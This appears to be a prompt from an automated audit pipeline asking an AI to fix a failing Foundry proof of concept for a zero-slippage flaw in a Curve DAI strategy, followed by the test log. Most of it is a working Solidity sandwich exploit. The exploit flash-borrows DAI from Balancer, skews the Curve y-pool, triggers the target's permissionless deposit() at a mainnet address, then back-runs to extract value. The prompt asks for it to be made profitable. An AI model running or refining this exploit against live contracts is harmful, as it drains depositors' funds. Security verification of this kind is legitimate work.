You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Curve deposits and exits execute with zero slippage protection, enabling MEV extraction
- claim: The strategy hardcodes zero minimum outputs for every Curve interaction: `add_liquidity(..., 0)`, `remove_liquidity(..., [0,0,0,0])`, and all three `exchange(..., 0)` calls. As a result, deposits, partial withdrawals, and full migrations will accept whatever execution price exists in the Curve y-pool at that moment.
- impact: A searcher can temporarily skew the Curve pool immediately before `deposit()`, `withdraw(uint)`, or `withdrawAll()`, force the strategy to mint or unwind at a severely unfavorable rate, then back-run the pool to keep the difference. This can extract a material portion of TVL from a single large deposit, withdrawal, or migration.
- exploit_paths: ["deposit() -> add_liquidity([_y,0,0,0], 0)", "withdraw(uint) -> _withdrawSome() -> withdrawUnderlying() -> remove_liquidity(_amount, [0,0,0,0]) -> exchange(..., 0)", "withdrawAll() -> _withdrawAll() -> withdrawUnderlying() -> remove_liquidity(_amount, [0,0,0,0]) -> exchange(..., 0)"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStrategyDAICurve {
    function deposit() external;
    function controller() external view returns (address);
}

interface IControllerLike {
    function vaults(address token) external view returns (address);
}

interface IYearnTokenLike {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

interface ICurveYPoolLike {
    function exchange(int128 from, int128 to, uint256 amountIn, uint256 minAmountOut) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    address internal constant TARGET = 0xaf274e912243b19B882f02d731dacd7CD13072D0;
    address internal constant CURVE_Y_POOL = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant YDAI = 0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01;
    address internal constant YUSDC = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;

    uint256 internal constant ONE_MILLION_DAI = 1_000_000e18;
    uint256 internal constant TWENTY_MILLION_DAI = 20_000_000e18;

    enum Mode {
        Idle,
        DepositFlash
    }

    Mode internal mode;

    uint256 internal baselineProfitBalance;
    uint256 internal realizedProfit;
    bool internal validated;
    string internal usedPath;
    string internal notes;

    constructor() {}

    function executeOnOpportunity() external {
        _resetOutcome();

        // Path feasibility summary for this verifier:
        // 1. deposit() is permissionless, so it is the only directly reachable target entrypoint from an
        //    external attacker when the strategy already holds idle DAI that can be forced through
        //    add_liquidity([_y,0,0,0], 0).
        // 2. withdraw(uint) on the strategy is controller-only. An honest same-tx "buy shares then withdraw"
        //    vault loop does not force the strategy path because the attacker's fresh vault deposit is idle and
        //    satisfies the redemption before controller/strategy liquidity is touched.
        // 3. withdrawAll() is a controller-only migration path and is not permissionless from this verifier.
        uint256 strategyIdleDai = IERC20Like(DAI).balanceOf(TARGET);
        if (strategyIdleDai == 0) {
            notes =
                "deposit() path infeasible at this fork state: target holds zero idle DAI. "
                "withdraw(uint) remains controller-gated and same-tx vault deposit/withdraw does not honestly reach strategy.withdraw because fresh idle vault liquidity satisfies the redemption first. "
                "withdrawAll() remains controller-only migration flow.";
            return;
        }

        baselineProfitBalance = IERC20Like(DAI).balanceOf(address(this));

        uint256 verifierHeldDai = IERC20Like(DAI).balanceOf(address(this));
        if (verifierHeldDai > 0) {
            try this.runDirectDepositSandwich(verifierHeldDai) {
                _finalizeOutcome("deposit() -> add_liquidity([_y,0,0,0], 0)");
                if (validated) {
                    return;
                }
            } catch {}
        }

        uint256 flashAmount = _suggestFlashAmount(strategyIdleDai);
        if (flashAmount == 0) {
            notes =
                "deposit() path detected but no usable DAI manipulation capital was available. "
                "withdraw(uint) and withdrawAll() remain infeasible for the non-controller verifier for the reasons described in code comments.";
            return;
        }

        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(DAI);
        amounts[0] = flashAmount;

        mode = Mode.DepositFlash;
        try IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes("")) {
            _finalizeOutcome("deposit() -> add_liquidity([_y,0,0,0], 0)");
        } catch {
            mode = Mode.Idle;
            notes =
                "deposit() path was reachable, but the live flash-funded manipulation reverted. "
                "withdraw(uint) stays non-permissionless from this verifier because StrategyDAICurve enforces msg.sender == controller, and withdrawAll() is the same controller-only migration flow.";
        }
    }

    function runDirectDepositSandwich(uint256 capital) external {
        require(msg.sender == address(this), "self only");
        _executeDepositSandwich(capital);
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not balancer");
        require(mode == Mode.DepositFlash, "bad mode");
        require(tokens.length == 1 && address(tokens[0]) == DAI, "bad token");

        _executeDepositSandwich(amounts[0]);

        _safeTransfer(DAI, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
        mode = Mode.Idle;
    }

    function profitToken() external pure returns (address) {
        return DAI;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function hypothesisValidated() external view returns (bool) {
        return validated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return usedPath;
    }

    function outcomeNotes() external view returns (string memory) {
        return notes;
    }

    function _executeDepositSandwich(uint256 daiCapital) internal {
        uint256 yUsdcBefore = IERC20Like(YUSDC).balanceOf(address(this));

        _safeApprove(DAI, YDAI, daiCapital);
        IYearnTokenLike(YDAI).deposit(daiCapital);

        uint256 yDaiAmount = IERC20Like(YDAI).balanceOf(address(this));
        _safeApprove(YDAI, CURVE_Y_POOL, yDaiAmount);

        // Path-strict front-run: make the pool yDAI-heavy so the target's single-coin add_liquidity mints
        // as little yCRV as the current state allows. This matches deposit() -> add_liquidity([_y,0,0,0], 0).
        ICurveYPoolLike(CURVE_Y_POOL).exchange(0, 1, yDaiAmount, 0);

        IStrategyDAICurve(TARGET).deposit();

        uint256 yUsdcAmount = IERC20Like(YUSDC).balanceOf(address(this)) - yUsdcBefore;
        _safeApprove(YUSDC, CURVE_Y_POOL, yUsdcAmount);

        // Back-run: unwind the temporary skew and realize the value left behind by the target's zero-slippage
        // add_liquidity execution.
        ICurveYPoolLike(CURVE_Y_POOL).exchange(1, 0, yUsdcAmount, 0);

        uint256 yDaiBalance = IERC20Like(YDAI).balanceOf(address(this));
        IYearnTokenLike(YDAI).withdraw(yDaiBalance);
    }

    function _suggestFlashAmount(uint256 strategyIdleDai) internal view returns (uint256) {
        uint256 balancerDai = IERC20Like(DAI).balanceOf(BALANCER_VAULT);
        if (balancerDai == 0) {
            return 0;
        }

        uint256 desired = strategyIdleDai * 50;
        if (desired < ONE_MILLION_DAI) {
            desired = ONE_MILLION_DAI;
        }
        if (desired > TWENTY_MILLION_DAI) {
            desired = TWENTY_MILLION_DAI;
        }

        uint256 maxAvailable = (balancerDai * 95) / 100;
        if (desired > maxAvailable) {
            desired = maxAvailable;
        }
        return desired;
    }

    function _finalizeOutcome(string memory path) internal {
        uint256 current = IERC20Like(DAI).balanceOf(address(this));
        if (current > baselineProfitBalance) {
            realizedProfit = current - baselineProfitBalance;
            validated = realizedProfit > 0;
            if (validated) {
                usedPath = path;
            }
        }

        if (!validated && bytes(notes).length == 0) {
            notes =
                "No positive DAI remained after unwinding temporary capital. "
                "The executable path in this verifier is the permissionless deposit() route; withdraw(uint) and withdrawAll() are not honestly reachable here without the controller role or pre-existing vault shares that can force a strategy pull.";
        }
    }

    function _resetOutcome() internal {
        mode = Mode.Idle;
        baselineProfitBalance = 0;
        realizedProfit = 0;
        validated = false;
        usedPath = "";
        notes = "";
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok, "token call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "token op false");
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.92s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 298398)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x6B175474E89094C44Da98b954EedeAC495271d0F
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 7904

Traces:
  [298398] FlawVerifierTest::testExploit()
    ├─ [218] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [257994] FlawVerifier::executeOnOpportunity()
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xaf274e912243b19B882f02d731dacd7CD13072D0) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [218] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    ├─ [314] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6B175474E89094C44Da98b954EedeAC495271d0F)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17426064 [1.742e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7904)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.28s (338.80ms CPU time)

Ran 1 test suite in 2.33s (2.28s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 298398)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
